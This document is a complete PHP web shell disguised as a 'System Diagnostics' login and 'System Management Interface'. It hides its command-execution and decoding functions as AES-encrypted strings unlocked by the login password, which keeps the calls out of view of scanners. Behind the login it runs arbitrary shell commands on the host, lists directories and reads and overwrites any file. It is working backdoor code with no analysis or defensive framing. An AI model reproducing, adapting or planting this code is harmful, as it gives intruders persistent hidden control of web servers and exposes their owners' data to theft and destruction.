<?php
error_reporting(0);
session_start();

$stored_user_hash = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
$stored_pass_hash = '343fcb40497549085c98ae137c137116a5c2442eb8dc0bf0cac3a3419ce05b9f';

function diagKeyDecode($payload, $pass_plain) {
    $key = hash('sha256', $pass_plain, true);
    $iv = substr($key, 0, 16);
    return openssl_decrypt(base64_decode($payload), 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
}

$diagLogParser     = '/Zt5QH2C9Rao8UYQlRy9/w==';
$dataStreamFilter  = 'u1Awy/VCOf940h0mhny+sA==';

if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['user'], $_POST['pass']) &&
        hash('sha256', $_POST['user']) === $stored_user_hash &&
        hash('sha256', $_POST['pass']) === $stored_pass_hash) {

        $_SESSION['auth'] = true;
        $_SESSION['pwd']  = $_POST['pass'];
        $_SESSION['cwd']  = getcwd();
        
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
?>
<!DOCTYPE html>
<html>
<head>
<title>System Diagnostics — Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style>
:root{
  --ink:#e6e6f0; --muted:#b7b0c9; --bg1:#1a1025; --bg2:#2a0f3b; --panel:#1e1630;
  --field:#2f2542; --border:#3d2e55; --accent:#7c4dff; --magenta:#ff3b7f; --turq:#00e5ff;
}
*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0; display:flex; align-items:center; justify-content:center;
  background: radial-gradient(1200px 600px at 20% 20%, var(--bg2) 0%, var(--bg1) 60%, #0b0712 100%);
  color:var(--ink); font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
}
.card{
  width:min(92vw,360px); background:linear-gradient(180deg, var(--panel), #1a1224);
  border:1px solid var(--border); border-radius:14px; padding:28px;
  box-shadow:0 12px 40px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.04);
}
.brand{display:flex; align-items:center; gap:10px; margin-bottom:16px}
.badge{
  width:36px; height:36px; border-radius:8px;
  background: conic-gradient(from 210deg, var(--accent), var(--magenta), var(--turq), var(--accent));
  box-shadow: 0 0 0 2px rgba(255,255,255,.06), 0 8px 24px rgba(124,77,255,.35);
}
h1{font-size:18px; margin:0}
.sub{color:var(--muted); font-size:12px; margin:4px 0 18px}
.input{
  width:100%; padding:12px; margin:0 0 12px; border-radius:10px; border:1px solid var(--border);
  background:linear-gradient(180deg, var(--field), #271c39); color:var(--ink);
}
.btn{
  width:100%; padding:12px 14px; border:none; border-radius:10px; cursor:pointer;
  background: linear-gradient(135deg, var(--magenta), var(--accent));
  color:white; font-weight:600; letter-spacing:.1px; transition: transform .06s ease, filter .2s ease;
  box-shadow: 0 10px 24px rgba(255,59,127,.25);
}
.btn:hover{filter:brightness(1.08)} .btn:active{transform:translateY(1px)}
.legal{margin-top:12px; color:#9c93b6; font-size:11px; text-align:center}
</style>
</head>
<body>
  <form class="card" method="post" autocomplete="off">
    <div class="brand">
      <div class="badge"></div>
      <div>
        <h1>System Diagnostics</h1>
        <div class="sub">Restricted operations console</div>
      </div>
    </div>
    <input class="input" type="text"     name="user" placeholder="Username" required autofocus>
    <input class="input" type="password" name="pass" placeholder="Password" required>
    <button class="btn" type="submit">Login</button>
    <div class="legal">© Diagnostics Module</div>
  </form>
</body>
</html>
<?php
        exit;
    }
}

$procHandler   = diagKeyDecode($diagLogParser, $_SESSION['pwd']);
$dataFormatter = diagKeyDecode($dataStreamFilter, $_SESSION['pwd']);

if ($procHandler === false || $dataFormatter === false) {
    die("Diagnostics module initialization failed.");
}

$output = '';
$command_executed = false;
if (isset($_POST['q']) && trim($_POST['q']) !== '') {
    $command_executed = true;
    $decoded = @$dataFormatter($_POST['q']);
    $cmd = ($decoded !== false && strlen($decoded) > 0 && ctype_print($decoded)) ? $decoded : $_POST['q'];
    
    if (preg_match('/^\s*cd\s+(.+)/', $cmd, $matches)) {
        $newDir = trim($matches[1]);
        if (@chdir($newDir)) {
            $_SESSION['cwd'] = realpath($newDir);
            $output = "[Diagnostics] Context changed to: " . $_SESSION['cwd'];
        } else {
            $output = "[Diagnostics] Failed to change context to: " . $newDir;
        }
    } else {
        $fullCmd = "cd " . escapeshellarg($_SESSION['cwd']) . " && " . $cmd . " 2>&1";
        $raw_output = $procHandler($fullCmd);
        $output = trim($raw_output);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Management Interface</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            background: radial-gradient(1200px 600px at 20% 20%, #2a0f3b 0%, #1a1025 60%, #0b0712 100%);
            color: #e6e6f0;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: linear-gradient(180deg, #1e1630, #1a1224);
            border: 1px solid #3d2e55;
            border-radius: 14px;
            box-shadow: 0 12px 40px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.04);
        }
        
        .header {
            background: linear-gradient(135deg, #7c4dff, #ff3b7f);
            padding: 15px 20px;
            border-bottom: 2px solid #3d2e55;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 1.2em;
            color: white;
            text-shadow: 0 0 10px rgba(124, 77, 255, 0.5);
        }
        
        .system-info {
            font-size: 0.8em;
            color: #b7b0c9;
        }
        
        .logout-link {
            background: linear-gradient(135deg, #ff3b7f, #d50000);
            color: white;
            padding: 8px 16px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
            transition: filter 0.2s ease;
        }
        
        .logout-link:hover {
            filter: brightness(1.1);
        }
        
        .main-content {
            padding: 20px;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .info-card {
            background: linear-gradient(180deg, #2f2542, #271c39);
            border: 1px solid #3d2e55;
            border-radius: 10px;
            padding: 15px;
            box-shadow: 0 4px 12px rgba(0,0,0,.3);
        }
        
        .info-card h3 {
            color: #7c4dff;
            margin-bottom: 10px;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .info-card p {
            font-size: 0.8em;
            line-height: 1.4;
            color: #b7b0c9;
        }
        
        .command-section {
            margin-top: 20px;
            background: linear-gradient(180deg, #2f2542, #271c39);
            border: 1px solid #3d2e55;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,.3);
        }
        
        .command-form {
            display: flex;
            margin-bottom: 15px;
            gap: 10px;
        }
        
        .command-input {
            flex: 1;
            background: linear-gradient(180deg, #2f2542, #271c39);
            border: 1px solid #3d2e55;
            color: #e6e6f0;
            padding: 12px;
            font-family: inherit;
            border-radius: 10px;
            outline: none;
        }
        
        .command-input:focus {
            box-shadow: 0 0 10px rgba(124, 77, 255, 0.3);
            border-color: #7c4dff;
        }
        
        .execute-btn {
            background: linear-gradient(135deg, #ff3b7f, #7c4dff);
            border: none;
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
            font-weight: 600;
            letter-spacing: 0.1px;
            box-shadow: 0 10px 24px rgba(255,59,127,.25);
        }
        
        .execute-btn:hover {
            filter: brightness(1.08);
            transform: translateY(-1px);
        }
        
        .output-area {
            background: #1a1224;
            border: 1px solid #3d2e55;
            border-radius: 10px;
            padding: 15px;
            min-height: 300px;
            max-height: 500px;
            overflow-y: auto;
            white-space: pre-line;
            font-size: 0.85em;
            line-height: 1.4;
            color: #e6e6f0;
            word-wrap: break-word;
        }
        
        .output-area:empty::before {
            content: "Command output will appear here...";
            color: #b7b0c9;
            font-style: italic;
        }
        
        .file-manager {
            margin-top: 20px;
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 20px;
        }
        
        .file-list {
            background: linear-gradient(180deg, #2f2542, #271c39);
            border: 1px solid #3d2e55;
            border-radius: 10px;
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
            box-shadow: 0 4px 12px rgba(0,0,0,.3);
        }
        
        .file-list h3 {
            color: #7c4dff;
            margin-bottom: 10px;
            font-size: 0.9em;
        }
        
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid #3d2e55;
            font-size: 0.8em;
            color: #e6e6f0;
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-item:hover {
            background: rgba(124, 77, 255, 0.1);
            border-radius: 5px;
        }
        
        .file-editor {
            background: linear-gradient(180deg, #2f2542, #271c39);
            border: 1px solid #3d2e55;
            border-radius: 10px;
            padding: 15px;
            box-shadow: 0 4px 12px rgba(0,0,0,.3);
        }
        
        .file-editor h3 {
            color: #7c4dff;
            margin-bottom: 10px;
            font-size: 0.9em;
        }
        
        .editor-textarea {
            width: 100%;
            height: 300px;
            background: linear-gradient(180deg, #2f2542, #271c39);
            border: 1px solid #3d2e55;
            color: #e6e6f0;
            padding: 12px;
            font-family: inherit;
            font-size: 0.8em;
            border-radius: 10px;
            resize: vertical;
            outline: none;
        }
        
        .editor-textarea:focus {
            box-shadow: 0 0 10px rgba(124, 77, 255, 0.3);
            border-color: #7c4dff;
        }
        
        .save-btn {
            margin-top: 10px;
            background: linear-gradient(135deg, #ff3b7f, #7c4dff);
            border: none;
            color: white;
            padding: 12px 16px;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            letter-spacing: 0.1px;
            transition: all 0.3s ease;
            box-shadow: 0 10px 24px rgba(255,59,127,.25);
        }
        
        .save-btn:hover {
            filter: brightness(1.08);
            transform: translateY(-1px);
        }
        
        .status-bar {
            background: #1a1224;
            border-top: 1px solid #3d2e55;
            padding: 10px 20px;
            font-size: 0.8em;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #b7b0c9;
        }
        
        .scrollbar-custom {
            scrollbar-width: thin;
            scrollbar-color: #7c4dff #1a1224;
        }
        
        .scrollbar-custom::-webkit-scrollbar {
            width: 8px;
        }
        
        .scrollbar-custom::-webkit-scrollbar-track {
            background: #1a1224;
        }
        
        .scrollbar-custom::-webkit-scrollbar-thumb {
            background: #7c4dff;
            border-radius: 4px;
        }
        
        .scrollbar-custom::-webkit-scrollbar-thumb:hover {
            background: #ff3b7f;
        }
        
        @media (max-width: 768px) {
            .file-manager {
                grid-template-columns: 1fr;
            }
            
            .info-grid {
                grid-template-columns: 1fr;
            }
            
            .command-form {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 System Management Interface</h1>
            <div class="system-info">
                <span id="current-time"></span> | 
                <span id="current-user">User: <?php echo get_current_user(); ?></span>
            </div>
            <a href="?logout=1" class="logout-link">Logout</a>
        </div>
        
        <div class="main-content">
            <div class="info-grid">
                <div class="info-card">
                    <h3>System Information</h3>
                    <p><strong>OS:</strong> <?php echo php_uname('s') . ' ' . php_uname('r'); ?><br>
                    <strong>Hostname:</strong> <?php echo php_uname('n'); ?><br>
                    <strong>Architecture:</strong> <?php echo php_uname('m'); ?></p>
                </div>
                
                <div class="info-card">
                    <h3>PHP Environment</h3>
                    <p><strong>Version:</strong> <?php echo PHP_VERSION; ?><br>
                    <strong>SAPI:</strong> <?php echo php_sapi_name(); ?><br>
                    <strong>Memory Limit:</strong> <?php echo ini_get('memory_limit'); ?></p>
                </div>
                
                <div class="info-card">
                    <h3>Current Directory</h3>
                    <p><strong>Path:</strong> <?php echo $_SESSION['cwd']; ?><br>
                    <strong>Writable:</strong> <?php echo is_writable($_SESSION['cwd']) ? 'Yes' : 'No'; ?><br>
                    <strong>Free Space:</strong> <?php echo round(disk_free_space($_SESSION['cwd']) / (1024 * 1024 * 1024), 2); ?> GB</p>
                </div>
            </div>
            
            <div class="command-section">
                <h3 style="color: #7c4dff; margin-bottom: 15px;">Command Execution</h3>
                <form method="post" class="command-form" id="commandForm">
                    <input type="text" name="q" class="command-input" id="commandInput" placeholder="Enter command..." autofocus>
                    <button type="submit" class="execute-btn">Execute</button>
                </form>
                
                <div class="output-area scrollbar-custom">
                    <?php
                    if (!empty($output)) {
                        echo htmlspecialchars($output);
                    }
                    ?>
                </div>
            </div>
            
            <div class="file-manager">
                <div class="file-list scrollbar-custom">
                    <h3>Directory Listing</h3>
                    <?php
                    $files = scandir($_SESSION['cwd']);
                    foreach ($files as $file) {
                        if ($file != '.') {
                            $fullPath = $_SESSION['cwd'] . '/' . $file;
                            $filesize = is_dir($fullPath) ? '<span style="color: #7c4dff;">[DIR]</span>' : number_format(filesize($fullPath)) . ' bytes';
                            $permissions = substr(sprintf('%o', fileperms($fullPath)), -4);
                            $fileIcon = is_dir($fullPath) ? '📁' : '📄';
                            echo "<div class='file-item'>";
                            echo "<span>{$fileIcon} " . htmlspecialchars($file) . "</span>";
                            echo "<span style='color: #b7b0c9; font-size: 0.7em;'>{$permissions} | {$filesize}</span>";
                            echo "</div>";
                        }
                    }
                    ?>
                </div>
                
                <div class="file-editor">
                    <h3>File Editor</h3>
                    <form method="post">
                        <input type="text" name="filename" placeholder="Enter filename..." style="width: 100%; margin-bottom: 10px; background: linear-gradient(180deg, #2f2542, #271c39); border: 1px solid #3d2e55; color: #e6e6f0; padding: 12px; border-radius: 10px; outline: none;" value="<?php echo isset($_POST['filename']) ? htmlspecialchars($_POST['filename']) : ''; ?>">
                        <textarea name="filecontent" class="editor-textarea scrollbar-custom" placeholder="File content will appear here..."><?php
                        if (isset($_POST['filename']) && file_exists($_POST['filename'])) {
                            echo htmlspecialchars(file_get_contents($_POST['filename']));
                        }
                        ?></textarea>
                        <button type="submit" name="save" class="save-btn">Save File</button>
                    </form>
                    
                    <?php
                    if (isset($_POST['save']) && isset($_POST['filename']) && isset($_POST['filecontent'])) {
                        $filename = $_POST['filename'];
                        $content = $_POST['filecontent'];
                        if (file_put_contents($filename, $content) !== false) {
                            echo "<div style='color: #7c4dff; margin-top: 10px; font-size: 0.8em;'>✓ File saved successfully</div>";
                        } else {
                            echo "<div style='color: #ff3b7f; margin-top: 10px; font-size: 0.8em;'>✗ Failed to save file</div>";
                        }
                    }
                    ?>
                </div>
            </div>
        </div>
        
        <div class="status-bar">
            <span>Interface ready | Connection established</span>
            <span style="margin-left: auto;">© syshell</span>
        </div>
    </div>
    
    <script>
        function updateTime() {
            const now = new Date();
            document.getElementById('current-time').textContent = now.toLocaleString();
        }
        updateTime();
        setInterval(updateTime, 1000);
        
        <?php if ($command_executed): ?>
        window.addEventListener('load', function() {
            setTimeout(function() {
                const input = document.getElementById('commandInput');
                input.value = '';
                input.focus();
            }, 100);
        });
        <?php else: ?>
        window.addEventListener('load', function() {
            document.getElementById('commandInput').focus();
        });
        <?php endif; ?>
        
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('commandInput').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    document.querySelector('.execute-btn').click();
                }
            });
        });
        
        window.addEventListener('load', function() {
            const outputArea = document.querySelector('.output-area');
            if (outputArea && outputArea.textContent.trim() !== '') {
                outputArea.scrollTop = outputArea.scrollHeight;
            }
        });
    </script>
</body>
</html>
